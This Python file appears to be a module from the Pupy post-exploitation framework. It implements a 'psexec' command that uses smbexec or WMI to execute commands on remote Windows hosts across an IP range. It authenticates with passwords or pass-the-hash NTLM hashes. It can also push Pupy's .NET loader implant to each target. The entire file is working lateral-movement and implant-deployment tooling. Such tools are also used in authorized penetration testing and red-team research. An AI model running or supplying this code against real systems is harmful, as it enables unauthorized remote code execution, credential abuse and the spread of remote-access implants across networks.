# -*- coding: utf-8 -*-
# Author: byt3bl33d3r and Shawn Evans
# Version used from the "rewrite" branch of smbexec written by byt3bl33d3r

from pupylib.PupyModule import (
    config, PupyModule, PupyArgumentParser,
    REQUIRE_STREAM
)
from netaddr import IPNetwork
from modules.lib.windows import powerloader

__class_name__ = "PSExec"

@config(cat="admin")
class PSExec(PupyModule):
    """ Launch remote commands using smbexec or wmiexec"""

    dependencies = [
        'unicodedata', 'idna', 'encodings.idna',
        'impacket', 'ntpath',
        'calendar', 'pupyutils.psexec'
    ]

    io = REQUIRE_STREAM

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="psexec", description=cls.__doc__)
        cls.arg_parser.add_argument("-u", metavar="USERNAME", dest='user', default='',
                                    help="Username, if omitted null session assumed")
        cls.arg_parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default='', help="Password")
        cls.arg_parser.add_argument("-c", metavar="CODEPAGE", dest='codepage', default='cp437', help="Codepage")
        cls.arg_parser.add_argument("-H", metavar="HASH", dest='hash', default='', help='NTLM hash')
        cls.arg_parser.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP",
                                    help="Domain name (default WORKGROUP)")
        cls.arg_parser.add_argument("-s", metavar="SHARE", dest='share', default="C$",
                                    help="Specify a share (default C$)")
        cls.arg_parser.add_argument("-S", dest='noout', action='store_true', help="Do not wait for command output")
        cls.arg_parser.add_argument("-T", metavar="TIMEOUT", dest='timeout', default=30, type=int,
                                    help="Try to set this timeout")
        cls.arg_parser.add_argument("--port", dest='port', type=int, choices={139, 445}, default=445,
                                    help="SMB port (default 445)")
        cls.arg_parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")

        sgroup = cls.arg_parser.add_argument_group("Command Execution", "Options for executing "
                                                                        "commands on the specified host")
        sgroup.add_argument('-execm', choices={"smbexec", "wmi"}, dest="execm", default="wmi",
                            help="Method to execute the command (default: wmi)")
        sgroup.add_argument(
            "-x", metavar="COMMAND", dest='command',
            help='Execute a command. Use pupy64/pupy86 for .NET loader. '
            'WARNING! There is no autodetection')

    def run(self, args):

        if "/" in args.target[0]:
            hosts = IPNetwork(args.target[0])
        else:
            hosts = list()
            hosts.append(args.target[0])

        smbexec = self.client.remote('pupyutils.psexec', 'smbexec')

        completions = []

        for host in hosts:
            if args.command in ('pupy86', 'pupy32', 'pupy64'):
                _, completion = powerloader.serve(
                    self, self.client.get_conf(),
                    host=str(host),
                    port=args.port,
                    user=args.user,
                    domain=args.domain,
                    password=args.passwd,
                    ntlm=args.hash,
                    execm=args.execm,
                    timeout=args.timeout,
                    arch='x64' if args.command == 'pupy64' else 'x86'
                )
                completions.append(completion)
                continue

            output, error = smbexec(
                str(host), args.port,
                args.user,  args.domain,
                args.passwd, args.hash,
                args.command, args.share,
                args.execm,
                args.codepage,
                args.timeout, not args.noout
            )

            if output:
                self.log(output)

            if error:
                self.error(error)

        if completions:
            self.info('Wait for completions')
            for completion in completions:
                if not completion.is_set():
                    completion.wait()
